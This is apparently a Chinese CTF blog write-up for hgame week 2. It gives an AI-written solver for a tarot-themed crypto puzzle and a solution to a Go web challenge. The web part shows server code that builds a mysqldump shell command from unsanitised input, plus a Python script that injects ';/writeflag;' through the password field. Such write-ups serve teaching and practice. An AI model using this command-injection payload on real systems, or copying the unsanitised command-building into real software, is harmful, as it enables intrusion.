---
title: hgame week2 wp
author: Z41sArrebol
date: 2025-02-20 15:59:23
tags:
    - CTF
    - wp
cover: /img/landscape/059.jpg
categories: 一个web蒟蒻的成长日记
---
week2明显力不从心了，签到少了，只做出来两题

web要学的东西还很多啊，Java反序列化都没做出来

一道crypto一道web，crypto是ai写的

Crypto 参见sean师傅的博客，我这里只给exp

[Sean师傅的博客](https://seandictionary.top/)

## Crypto Ancient Recall

```python

Major_Arcana = ["The Fool", "The Magician", "The High Priestess", "The Empress", "The Emperor", "The Hierophant", "The Lovers", "The Chariot", "Strength", "The Hermit", "Wheel of Fortune", "Justice", "The Hanged Man", "Death", "Temperance", "The Devil", "The Tower", "The Star", "The Moon", "The Sun", "Judgement", "The World"]
wands = ["Ace of Wands", "Two of Wands", "Three of Wands", "Four of Wands", "Five of Wands", "Six of Wands", "Seven of Wands", "Eight of Wands", "Nine of Wands", "Ten of Wands", "Page of Wands", "Knight of Wands", "Queen of Wands", "King of Wands"]
cups = ["Ace of Cups", "Two of Cups", "Three of Cups", "Four of Cups", "Five of Cups", "Six of Cups", "Seven of Cups", "Eight of Cups", "Nine of Cups", "Ten of Cups", "Page of Cups", "Knight of Cups", "Queen of Cups", "King of Cups"]
swords = ["Ace of Swords", "Two of Swords", "Three of Swords", "Four of Swords", "Five of Swords", "Six of Swords", "Seven of Swords", "Eight of Swords", "Nine of Swords", "Ten of Swords", "Page of Swords", "Knight of Swords", "Queen of Swords", "King of Swords"]
pentacles = ["Ace of Pentacles", "Two of Pentacles", "Three of Pentacles", "Four of Pentacles", "Five of Pentacles", "Six of Pentacles", "Seven of Pentacles", "Eight of Pentacles", "Nine of Pentacles", "Ten of Pentacles", "Page of Pentacles", "Knight of Pentacles", "Queen of Pentacles", "King of Pentacles"]
Minor_Arcana = wands + cups + swords + pentacles
tarot = Major_Arcana + Minor_Arcana

def inverse_fortune_wheel(current):
    a, b, c, d, e = current
    numerator = a + b + d - c - e
    if numerator % 2 != 0:
        raise ValueError("Cannot invert, odd numerator.")
    v1 = numerator // 2
    v0 = a - v1
    v2 = b - v1
    v3 = c - v2
    v4 = d - v3
    assert (v4 + v0) == e, "Validation failed."
    return [v0, v1, v2, v3, v4]

final_values = [
    2532951952066291774890498369114195917240794704918210520571067085311474675019,
    2532951952066291774890327666074100357898023013105443178881294700381509795270,
    2532951952066291774890554459287276604903130315859258544173068376967072335730,
    2532951952066291774890865328241532885391510162611534514014409174284299139015,
    2532951952066291774890830662608134156017946376309989934175833913921142609334
]

current = final_values.copy()
for _ in range(250):
    current = inverse_fortune_wheel(current)

def get_card_name(v):
    idx = v % 78
    reversed_idx = (idx ^ -1) % 78
    if 0 <= reversed_idx < 22:
        return f"re-{Major_Arcana[reversed_idx]}"
    elif idx < 22:
        return Major_Arcana[idx]
    else:
        minor_idx = idx - 22
        suit = minor_idx // 14
        card = minor_idx % 14
        suit_name = ['Wands', 'Cups', 'Swords', 'Pentacles'][suit]
        if card < 10:
            number = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine', 'Ten'][card]
            return f"{number} of {suit_name}"
        else:
            court = ['Page', 'Knight', 'Queen', 'King'][card - 10]
            return f"{court} of {suit_name}"

initial_fate = [get_card_name(v) for v in current]
flag = "hgame{" + "&".join(initial_fate).replace(" ", "_") + "}"
print(flag)
```

## web honeyhot

审计源码

```go
func ImportData(c *gin.Context) {
	var config ImportConfig
	if err := c.ShouldBindJSON(&config); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"message": "Invalid request body: " + err.Error(),
		})
		return
	}
	if err := validateImportConfig(config); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"message": "Invalid input: " + err.Error(),
		})
		return
	}

	config.RemoteHost = sanitizeInput(config.RemoteHost)
	config.RemoteUsername = sanitizeInput(config.RemoteUsername)
	config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)
	config.LocalDatabase = sanitizeInput(config.LocalDatabase)
	if manager.db == nil {
		dsn := buildDSN(localConfig)
		db, err := sql.Open("mysql", dsn)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{
				"success": false,
				"message": "Failed to connect to local database: " + err.Error(),
			})
			return
		}

		if err := db.Ping(); err != nil {
			db.Close()
			c.JSON(http.StatusInternalServerError, gin.H{
				"success": false,
				"message": "Failed to ping local database: " + err.Error(),
			})
			return
		}

		manager.db = db
	}
	if err := createdb(config.LocalDatabase); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"success": false,
			"message": "Failed to create local database: " + err.Error(),
		})
		return
	}
	//Never able to inject shell commands,Hackers can't use this,HaHa
	command := fmt.Sprintf("/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s",
		config.RemoteHost,
		config.RemoteUsername,
		config.RemotePassword,
		config.RemoteDatabase,
		localConfig.Username,
		localConfig.Password,
		config.LocalDatabase,
	)
```

dirsearch扫一下发现flag目录但是403，审计源码注意到config.RemotePassword无过滤

且题目提示执行writeflag命令，于是构造即可

```python
import requests
target="http://node1.hgame.vidar.club:32511"
res = requests.post(target+'/api/import',json={
    "remote_host": "127.0.0.1",
    "remote_port": "3389",
    "remote_username": "test_usernane",
    "remote_password": ";/writeflag;",
    "remote_database": "test_databaseName",
    "local_database": "test_localdatabaseName"
})
print(res.text)
res = requests.get(target+'/flag')
print(res.text)

```

‍
